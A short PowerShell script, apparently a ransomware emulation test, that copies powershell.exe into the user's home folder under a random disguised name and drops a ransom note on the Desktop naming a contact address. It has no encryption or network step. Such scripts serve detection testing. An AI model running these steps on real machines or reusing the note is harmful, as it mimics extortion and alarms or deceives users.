# Copy the Powershell executable to User's home directory, with the name EnNoB-{#}.exe,
# where {#} is a number between 1000 and 9876.
$TargetNum = Get-Random -Minimum 1000 -Maximum 9876
$TargetPath= (
    Join-Path "$env:USERPROFILE" "EnNoB-$TargetNum.exe"
    )

Copy-Item "C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe" $TargetPath

# check that the previous operation succeeded.
if ( Test-Path $TargetPath -PathType Leaf) {
    Write-Host "File $TargetPath was found"
} else {
    Write-Host "Either $TargetPath does not exist or it's not a file."
    exit 1 # non-zero exit code indicates failure
}

# Create a ransom note in the user's desktop directory
$RansomNote = (Join-Path $env:USERPROFILE "Desktop" "Readme.READ" )
$RansomDemand =`
 "If you want your files restored, please contact me at clearlyevil@earrayminkoff.tech. " +`
 "I look forward to doing business with you."

Set-Content $RansomNote $RansomDemand

# check that the previous operation succeeded.
if ( Test-Path $RansomNote -PathType Leaf) {
    Write-Host "Ransom note successfully dropped to desktop directory."
} else {
    Write-Host "Either $RansomNote does not exist or it's not a file."
    exit 1 # non-zero exit code indicates failure
}